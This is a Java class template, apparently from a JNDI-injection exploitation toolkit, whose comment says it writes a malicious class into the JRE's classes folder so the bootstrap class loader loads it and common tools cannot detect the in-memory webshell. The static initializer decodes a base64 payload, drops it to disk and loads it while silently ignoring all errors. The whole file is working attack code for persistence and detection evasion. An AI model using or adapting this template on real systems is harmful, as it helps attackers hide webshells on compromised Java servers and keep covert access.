package com.qi4l.jndi.template;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;

/**
 * 通过落地恶意文件到 /jre/classes 来使 Bootstrap ClassLoader 加载恶意代码
 * 使常见的工具无法检测出系统内的内存马
 * 由于 classes 文件夹默认不存在，因此需要较高的读写权限
 *
 */
public class HideMemShellTemplate extends ClassLoader{
    static String b64;

    static String className;

    static {
        try {
            writeClassFileToJRE(className, b64);
            new HideMemShellTemplate().loadClass(className);
        } catch (Exception ignored) {
        }
    }

    public static void writeClassFileToJRE(String className, String base64Content) throws Exception {
        ByteArrayInputStream  bais = new ByteArrayInputStream(base64Decode(base64Content));
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[]                bs   = new byte[4096];
        int                   read;

        while ((read = bais.read(bs)) != -1) {
            baos.write(bs, 0, read);
        }

        byte[] bytes = baos.toByteArray();

        String javaHome = System.getenv().get("JAVA_HOME");
        javaHome = javaHome == null ? System.getProperty("java.home") : javaHome;

        if (javaHome != null && (!javaHome.endsWith("jre/") || !javaHome.endsWith("jre"))) {
            javaHome += "/jre/";
        }

        File file = new File(javaHome + "/classes/" + className.replace(".", "/") + ".class");

        if (!file.getParentFile().exists()) {
            file.getParentFile().mkdirs();
        }

        FileOutputStream fos = new FileOutputStream(file);
        fos.write(bytes);
        fos.flush();
        fos.close();
    }

    public static byte[] base64Decode(String bs) {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }
        return value;
    }


    @Override
    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
        System.out.println(Thread.currentThread().getContextClassLoader());
        return Class.forName(name, true, Thread.currentThread().getContextClassLoader());
    }
}
